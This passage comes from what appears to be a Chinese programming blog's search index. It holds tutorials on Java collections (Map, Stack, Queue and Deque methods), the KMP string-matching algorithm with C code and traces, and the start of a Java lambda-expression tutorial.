class="line">    Iterator&lt;String&gt; iter = list.iterator();</span><br><span class="line">    <span class="keyword">while</span>(iter.hasNext())&#123;</span><br><span class="line">        </span><br><span class="line">        String str = iter.next();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;A&quot;</span>.equals(str)) &#123;</span><br><span class="line">            </span><br><span class="line">            iter.remove();</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * list set</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误示范：集合迭代时，不能同时进行元素删除</span></span><br><span class="line"><span class="keyword">while</span>(iter.hasNext())&#123;</span><br><span class="line">    String str = iter.next();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;A&quot;</span>.equals(str)) &#123;</span><br><span class="line">        iter.remove();  </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Map接口"><a href="#Map接口" class="headerlink" title="Map接口"></a>Map接口</h3><ol>
<li>保存形式：<ul>
<li>key ——&gt; value的方式保存</li>
<li>例：小雪：15806880888</li>
</ul>
</li>
<li>常用子类：<ul>
<li>HashMap：无序存放，key不允许重复</li>
<li>Hashtable：无序存放，key不允许重复</li>
<li>TreeMap：（按键）有序（<strong>红黑树</strong>算法）存放，key不允许重复</li>
</ul>
</li>
</ol>
<h3 id="Stack接口"><a href="#Stack接口" class="headerlink" title="Stack接口"></a>Stack接口</h3><p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240524114659.png" alt="在这里插入图片描述"></p>
<ol>
<li><p>Stack继承了Vector，Vector和ArrayList类似，都是动态的顺序表</p>
</li>
<li><p>常用方法：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>Stack()</td>
<td>构造一个空的栈</td>
</tr>
<tr>
<td>E push(E e)</td>
<td>将e入栈，并返回e</td>
</tr>
<tr>
<td>E pop()</td>
<td>将栈顶元素出栈并返回</td>
</tr>
<tr>
<td>E peek()</td>
<td>获取栈顶元素</td>
</tr>
<tr>
<td>int size()</td>
<td>获取栈中有效元素个数</td>
</tr>
<tr>
<td>boolean empty()</td>
<td>检测栈是否为空</td>
</tr>
</tbody></table>
</li>
</ol>
<h3 id="Queue接口"><a href="#Queue接口" class="headerlink" title="Queue接口"></a>Queue接口</h3><p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240524114251.png" alt="image-20240524114244817"></p>
<ol>
<li><p>Queue是普通队列，Deque是双端队列</p>
</li>
<li><p>普通队列常用的类有：PriorityQueue优先权队列</p>
</li>
<li><p>双端队列常用类有：LinkedList队列、ArrayDeque队列</p>
</li>
<li><p><strong>Java 已不推荐使用 Stack，而是推荐使用更高效的 ArrayDeque，次选 LinkedList</strong> 。</p>
</li>
<li><p><strong>Queue</strong>和<strong>Deque</strong>常用方法对比：</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>Queue方法</th>
<th>Deque方法</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>会抛异常</strong></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>入队</td>
<td>add(e)</td>
<td>addLast(e)</td>
<td></td>
</tr>
<tr>
<td>出队</td>
<td>remove()</td>
<td>removeFirst()</td>
<td></td>
</tr>
<tr>
<td>得到队头的引用</td>
<td>element()</td>
<td>getFirst()</td>
<td></td>
</tr>
<tr>
<td><strong>不会抛异常</strong></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>入队</td>
<td>offer(e)</td>
<td>offerLast(e)</td>
<td></td>
</tr>
<tr>
<td>出队</td>
<td>poll()</td>
<td>pollFirst()</td>
<td></td>
</tr>
<tr>
<td>得到队头的引用</td>
<td>peek()</td>
<td>peekFirst()</td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p><strong>Deque</strong>作为双端队列的特有方法：</p>
<table>
<thead>
<tr>
<th></th>
<th>操作头</th>
<th>操作头</th>
<th>操作尾</th>
<th>操作尾</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>会抛异常</td>
<td>不会抛异常</td>
<td>会抛异常</td>
<td>不会抛异常</td>
</tr>
<tr>
<td>插入</td>
<td>addFirst(e)</td>
<td>offerFirst(e)</td>
<td>addLast(e)</td>
<td>offerLast(e)</td>
</tr>
<tr>
<td>删除</td>
<td>removeFirst()</td>
<td>pollFirst()</td>
<td>removeLast()</td>
<td>pollLast()</td>
</tr>
<tr>
<td>取值</td>
<td>getFirst()</td>
<td>peekFirst()</td>
<td>getLast()</td>
<td>peekLast()</td>
</tr>
</tbody></table>
</li>
</ol>
]]></content>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-KMP字符串匹配</title>
    <url>/2021/11/30/KMP%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><span id="more"></span>

<p>KMP算法用途是进行字符串的匹配。</p>
<p><strong>KMP算法</strong>相对于暴力算法有着较大的改进，主要是<strong>消除了主串指针的回溯</strong>（即主串只需要扫描一遍），从而使算法的效率有了某种程度的提高</p>
<p>**时间复杂度：O(n+m)**，n是主串的长度，m是模式串的长度</p>
<p>那么KMP算法是如何消除对主串的回溯的呢？</p>
<p>那么便需要理解KMP算法中的两个核心的东西：<strong>next[]数组</strong>（该数组由模式串决定），<strong>借助next[]数组 把 主串 和 模式串 进行匹配</strong>。</p>
<h2 id="next-数组"><a href="#next-数组" class="headerlink" title="next[]数组"></a>next[]数组</h2><p>KMP算法的第一项工作便是求出next数组（换句话说就是，next[]数组是KMP算法得以进行的前提条件）。</p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p><strong>next[]数组的作用：万一模式串的某一个字符与主串匹配失败的时候，next[]数组对应下标的值可以指示模式串向右移动的步数</strong>（重点，作用理透了，next数组的底层原理，也就懂了一大半了）（参见下面的各变量的含义的“从全局上看”，两者是一个意思）</p>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在计算next数组之前，我们先理解几个<strong>next[]数组中所涉及到的概念</strong>：</p>
<ul>
<li>前缀</li>
<li>后缀</li>
<li>最大公共前、后缀</li>
</ul>
<p><img src="https://i.loli.net/2021/11/30/KHRjNDcV1JzFbGi.png" alt="image-20211130204952589"></p>
<p><img src="https://i.loli.net/2021/11/30/d2HQ6OcJCFIyevk.png" alt="image-20211130205213016"></p>
<p>那么，最大公共前、后缀，理所当然就是指前缀、后缀中最大长度公共的辣！（可以轻松肉眼看出，上面字符串的最大公共前、后缀的长度为0，这算是当时设计的失误吧<img src="https://i.loli.net/2021/11/30/567cthCiejH8Pru.png" alt="img">)</p>
<p>好了，基本概念讲到这就结束了。</p>
<h3 id="计算next-数组"><a href="#计算next-数组" class="headerlink" title="计算next[]数组"></a>计算next[]数组</h3><p>在计算next[]数组的时候，有两种理解方式，但是这两种区别不大，分别是：</p>
<ol>
<li><p>模式串的下标为0的地方存储字符数据</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Getnext</span><span class="params">(<span class="keyword">int</span> next[],String t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> j=<span class="number">0</span>,k=<span class="number">-1</span>;</span><br><span class="line">   next[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">   <span class="keyword">while</span>(j&lt;t.length<span class="number">-1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">if</span>(k == <span class="number">-1</span> || t[j] == t[k])</span><br><span class="line">      &#123;</span><br><span class="line">         j++;k++;</span><br><span class="line">         next[j] = k;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> k = next[k];<span class="comment">//此语句是这段代码最反人类的地方，如果你一下子就能看懂，那么请允许我称呼你一声大神！</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>模式串的下标为0的地方不存储字符数据（本文采取这种，因为这种或许理解起来，更人性化一丢丢）（但是两种从本质上来讲，是一样的，理解了一种之后，在看另一种，也就懂了）</p>
</li>
</ol>
<p>先放上代码（看不懂没关系，接着往后看讲解就行）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ch数组是模式串，length是模式串的长度，next数组就是我们所要求的next[]数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getnext</span><span class="params">(<span class="keyword">char</span> ch[],<span class="keyword">int</span> length, <span class="keyword">int</span> next[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; length) &#123;</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">0</span> || ch[i] == ch[j])</span><br><span class="line">            next[++i] = ++j;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            j = next[j];	<span class="comment">//j回退</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先我们要这段程序里，每个变量所代表的意思是什么？</p>
<h4 id="各变量的含义"><a href="#各变量的含义" class="headerlink" title="各变量的含义"></a>各变量的含义</h4><blockquote>
<p><strong>！一定要知道各变量的含义！</strong></p>
<p><strong>！一定要知道各变量的含义！</strong></p>
<p><strong>！一定要知道各变量的含义！</strong></p>
<p>ch，length，next三个变量不再多说；</p>
<p><strong>i</strong>，在本段代码中代表的是<strong>当前next已经计算到的位置</strong>（next[]数组是从0开始往右计算的）</p>
<p><strong>j</strong>，在本单代码中表示的是<strong>对于每段字符串（对于整个模式串，会将其像前缀那样分解成一个一个小的字符串计算next数组）的前缀的最后一个字符的下一个位置</strong>（后面需要用到 j 的回退）</p>
<ul>
<li><strong>从全局看</strong>，next[]数组表示的是万一模式串的某一个字符与主串匹配失败时，所需要将模式串右移的步数；</li>
<li><strong>从局部上看，</strong>j是next数组能够每一个值都计算正确（即某一个字符匹配失败的时候，能够将模式串右移正确的步数）的保障（因为j可以回退）</li>
</ul>
</blockquote>
<h4 id="程序过程讲解"><a href="#程序过程讲解" class="headerlink" title="程序过程讲解"></a>程序过程讲解</h4><p>过程讲解主要抓住两点：<strong>条件</strong>+<strong>结果变化</strong></p>
<p>起始值：j=0，i=1</p>
<p><img src="https://i.loli.net/2021/12/01/MXFqu7vdzB2QxAJ.png" alt="image-20211201001018536"></p>
<p>状态0：条件：<code>j == 0</code>；结果变化：<code>next[++i] = ++j;</code>，执行后，j = 1，i = 2，next[1]=0，next[2]=1</p>
<p><img src="https://i.loli.net/2021/12/01/wS4Gl5ryWFvImnJ.png" alt="image-20211201001114435"></p>
<p>状态1：条件：<code>j == 0 || ch[i] == ch[j]</code>为假；结果变化：<code>j = next[j]</code>；执行后，j=0，i=2，next[1]=0，next[2]=1</p>
<p><img src="https://i.loli.net/2021/12/01/8IvcxoX5bPJnudD.png" alt="image-20211201001157288"></p>
<p>状态2：条件：<code>j == 0</code>；结果变化：<code>next[++i] = ++j</code>；执行后，j=1，i=3，next[1]=0，next[2]=1，next[3]=1</p>
<p><img src="https://i.loli.net/2021/12/01/OneK5WPcuybd9Q2.png" alt="image-20211201001241442"></p>
<p>状态3：条件：<code>j == 0 || ch[i] == ch[j]</code>为假；结果变化：<code>j = next[j]</code>；执行后，j=0，i=3，next[1]=0，next[2]=1，next[3]=1</p>
<p><img src="https://i.loli.net/2021/12/01/RT3Py1g2mQH9Lzn.png" alt="image-20211201001426114"></p>
<p>状态4：条件：<code>j == 0</code>；结果变化：<code>next[++i] = ++j</code>；执行后，j=1，i=4，next[1]=0，next[2]=1，next[3]=1，next[4]=1</p>
<p><img src="https://i.loli.net/2021/12/01/i37zwESFDmLZMsj.png" alt="image-20211201001503800"></p>
<p>状态5：条件：<code>j == 0 || ch[i] == ch[j]</code>为假；结果变化：<code>j = next[j]</code>；执行后，j=0，i=4，next[1]=0，next[2]=1，next[3]=1，next[4]=1</p>
<p><img src="https://i.loli.net/2021/12/01/1ITXAZoKdvH6NLt.png" alt="image-20211201001523604"></p>
<p>状态6：条件：<code>j == 0</code>；结果变化：<code>next[++i] = ++j</code>；执行后，j=1，i=5，next[1]=0，next[2]=1，next[3]=1，next[4]=1，next[5]=1</p>
<p><img src="https://i.loli.net/2021/12/01/R5a2UQAIlEuS7BX.png" alt="image-20211201001556363"></p>
<p>状态7：条件：<code>ch[i] == ch[j]</code>；结果变化：<code>next[++i] = ++j</code>；执行后，j=2，i=6，next[1]=0，next[2]=1，next[3]=1，next[4]=1，next[5]=1，next[6] =2</p>
<p><img src="https://i.loli.net/2021/12/01/wHPGik9p83OK1dy.png" alt="image-20211201001735982"></p>
<p>状态8：条件：<code>ch[i] == ch[j]</code>；结果变化：<code>next[++i] = ++j</code>；执行后，j=3，i=7，next[1]=0，next[2]=1，next[3]=1，next[4]=1，next[5]=1，next[6] =2，next[7]=3</p>
<p><img src="https://i.loli.net/2021/12/01/wa6JquUi91YtN7Q.png" alt="image-20211201001825655"></p>
<p>状态9：此时，条件：<code>i &lt; length</code>已经不满足，所以跳出循环，此时<strong>next[]数组计算结束</strong></p>
<h4 id="next-数组计算过程总结"><a href="#next-数组计算过程总结" class="headerlink" title="next[]数组计算过程总结"></a>next[]数组计算过程总结</h4><p>经过上述的过程剖析，有这样几个发现：</p>
<ol>
<li>这里下标并没有用到0</li>
<li>i自始至终没有回退</li>
<li>j有回退，但是一直处于前缀当中</li>
</ol>
<p>暂时可以下几个结论（同时也佐证了上面所讲的<strong>各变量的含义</strong>）：</p>
<ol>
<li><strong>next[k]的值是由前面k-1个字符所组成的字符串</strong>（不看k位置的字符）（确切的说，是前k-1个字符所组成的字符串的最大公共前、后缀的长度）决定的</li>
<li>j==0判断为真，的作用是为了让k处的字符匹配失败的时候，能够让下标为1处的字符与主串进行匹配</li>
</ol>
<p>理解到这就是成功一大半啦！</p>
<p><img src="https://i.loli.net/2021/11/30/yRcok5pSYlgvEJK.jpg" alt="src=http___hbimg.b0.upaiyun.com_c9b3313f36ec6b50c17ad05a6b4d84f6532729c136dd2-t5mggH_fw658&amp;refer=http___hbimg.b0.upaiyun"></p>
<h2 id="KMP算法匹配"><a href="#KMP算法匹配" class="headerlink" title="KMP算法匹配"></a>KMP算法匹配</h2><p>经过上面的步骤，我们现在已经有了next数组了。接下来只需要借助next数组进行模式串和主串匹配就可以了。</p>
<p>要想将主串和模式串进行比较，</p>
<p>因为next[]计算方式采取的是上面的第二种方式（即下标为0的位置不存储字符数据），所以KMP匹配算法也才去对应的下标为0的地方不存储字符数据。</p>
<p>上代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//s是主串，len1是主传的长度，p是模式串，len2是模式串的长度，next是求得的next[]数组 </span></span><br><span class="line"><span class="comment">//查询到了，就返回模式串在主串中的位置</span></span><br><span class="line"><span class="comment">//如果没有查询到，就返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmp</span><span class="params">(<span class="keyword">char</span> s[], <span class="keyword">int</span> len1, <span class="keyword">char</span> p[], <span class="keyword">int</span> len2, <span class="keyword">int</span> next[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//这里i也可以为1，j也可以为1，这样就可以直接从下标为1的位置开始查询了</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= len1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//这里的j==0为真的时候，表示需要将模式串的第一个字符和主串的下一个字符进行匹配，所以需要进去执行i++, j++;</span></span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || s[i] == p[j])</span><br><span class="line">        &#123;</span><br><span class="line">            i++, j++;</span><br><span class="line">            <span class="keyword">if</span> (j == len2)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//返回的是模式串在主串中的第一个字符出现的位置 </span></span><br><span class="line">                <span class="keyword">return</span> i + <span class="number">1</span> - len2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的方法，代码看不懂没关系，小的这就为您来讲解蛤(～￣▽￣)～ </p>
<p><img src="https://i.loli.net/2021/11/30/hWBVom3ANpin2H4.jpg" alt="src=http___bpic.588ku.com_element_pic_17_10_06_fc8c4574f01bbf61cd3fb28bdb4ea40b.jpg&amp;refer=http___bpic.588ku"></p>
<p>理解了上面的next数组的计算方法后，这个KMP匹配的过程就变得简单了。</p>
<p>案例：</p>
<p><img src="https://i.loli.net/2021/12/01/2Q85oYeZOkIqSnG.png" alt="image-20211201000020699"></p>
<p>这里可以换一种理解方式，按照<strong>“条件 → 结果”</strong>的方式理解：</p>
<p>在匹配的过程中，会出现三种情况（<strong>条件</strong>）：</p>
<ol>
<li>j回退到了0（回退是第3种情况的发生所导致的，看下面结果所采取的的措施就明白了）</li>
<li>s[i] == p[j]（即主串和模式串对应的字符相等）</li>
<li>上述1和2两种情况都没有发生（即主串和模式串对应的字符不相等，且j不是0）</li>
</ol>
<p><strong>结果：</strong></p>
<ul>
<li>1和2都是需要将主串下一个字符与模式串 j+1 位置的字符进行比较的。</li>
<li>而第3种，就需要借助next[]数组，将 j 进行回退了，以便下次匹配的时候能够达到：既不需要回溯，又不会错过能够进行匹配的情况（不断提高了效率，还保证了正确性）</li>
</ul>
<h2 id="提供一个检测的算法正确性的例子"><a href="#提供一个检测的算法正确性的例子" class="headerlink" title="提供一个检测的算法正确性的例子"></a>提供一个检测的算法正确性的例子</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ch数组是模式串，length是模式串的长度，next数组就是我们所要求的next[]数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getnext</span><span class="params">(<span class="keyword">char</span> ch[],<span class="keyword">int</span> length, <span class="keyword">int</span> next[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; length) &#123;</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">0</span> || ch[i] == ch[j])</span><br><span class="line">            next[++i] = ++j;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            j = next[j];	<span class="comment">//j回退</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//s是主串，len1是主传的长度，p是模式串，len2是模式串的长度，next是求得的next[]数组 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmp</span><span class="params">(<span class="keyword">char</span> s[], <span class="keyword">int</span> len1, <span class="keyword">char</span> p[], <span class="keyword">int</span> len2, <span class="keyword">int</span> next[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= len1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || s[i] == p[j])</span><br><span class="line">        &#123;</span><br><span class="line">            i++, j++;</span><br><span class="line">            <span class="keyword">if</span> (j == len2)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//返回的是模式串在主串中的第一个字符出现的位置 </span></span><br><span class="line">                <span class="keyword">return</span> i + <span class="number">1</span> - len2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//模式串 </span></span><br><span class="line">    <span class="keyword">char</span> a[] = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;D&#x27;</span>&#125;;</span><br><span class="line">    <span class="comment">//主串 </span></span><br><span class="line">    <span class="keyword">char</span> b[] = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;D&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">int</span> next[<span class="number">8</span>];</span><br><span class="line">    <span class="comment">//计算出next[]数组 </span></span><br><span class="line">    getnext(a,length,next);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;next数组对应的值（不包括下标为0的位置）：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,next[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n返回查询结果&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> result = kmp(b,<span class="number">9</span>,a,<span class="number">7</span>,next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,result);	</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>到这里就真的结束啦</p>
<p><img src="https://i.loli.net/2021/12/01/1IHcmwPl4ynU7jz.gif" alt="src=http___www.xinyi.com_UploadFile_common_wechat_2020_12-23_4578bef0-4c0f-4e8d-b69c-044a758b700a.png&amp;refer=http___www.xinyi"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，KMP算法的核心，给我的感觉就是一个next[]数组，它能够让主串和模式串匹配时，在不回溯的情况下，还能保证不会漏掉一些可以进行匹配的情况。</p>
<p>需要重点学习的还是next[]数组的构造过程，next[]数组会构造以后，就可以自己借助next[]数组来完成KMP匹配算法的实现过程啦！</p>
]]></content>
      <tags>
        <tag>字符串匹配</tag>
        <tag>算法</tag>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title>Lambda表达式</title>
    <url>/2021/08/31/Lamda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="函数式接口的定义"><a href="#函数式接口的定义" class="headerlink" title="函数式接口的定义"></a>函数式接口的定义</h2><span id="more"></span>

<ul>
<li>任何接口，如果<strong>只包含唯一一个抽象方法</strong>，那么它就是一个函数式接口</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>对于函数式接口，我们可以通过lambda表达式来创建该接口的对象</li>
</ul>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p><strong>语法</strong>和<strong>简化技巧</strong>同<strong>ES6中的箭头函数</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 6.用Lambda简化（接口必须是函数式接口）</span></span><br><span class="line">like = () -&gt; &#123;		<span class="comment">// like是Like类的一个对象</span></span><br><span class="line">	System.out.println(<span class="string">&quot;我喜欢lambda6&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>简化技巧：</strong></p>
<ul>
<li><strong>参数类型</strong>可以不写（默认设置为接口中的参数类型；要么全去掉，要么全加上）</li>
<li>参数列表的<strong>括号</strong>可以省略（只有仅含一个参数的时候，才可以省略）</li>
<li>方法体的<strong>大括号</strong>可以省略（只有当方法体中只有一条语句的时候，才可以省略）</li>
</ul>
<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.定义一个函数式接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.普通类实现接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Like1</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我喜欢lambda&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestLambda</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 3.非静态内部类（对外不直接可见，必须有一个外部类的引用才能被创建）</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Like2</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我喜欢lambda2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.静态内部类（对外直接可见，可以直接创建对象）</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Like3</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我喜欢lambda3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Like like = <span class="keyword">new</span> Like1();</span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        like = <span class="keyword">new</span> TestLambda().<span class="function">new <span class="title">Like2</span><span class="params">()</span></span>;    <span class="comment">// 创建非静态内部类</span></span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        like = <span class="keyword">new</span> Like3();     <span class="comment">//  创建静态内部类</span></span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.局部内部类</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Like4</span> <span class="keyword">implements</span> <span class="title">Like</span> </span>&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lambda</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;我喜欢lambda4&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        like = <span class="keyword">new</span> Like4();</span><br><span class="line">        like.lambda();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.匿名内部类（没有类名，必须借助接口或者父类）</span></span><br><span class="line">        like = <span class="keyword">new</span> Like() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span 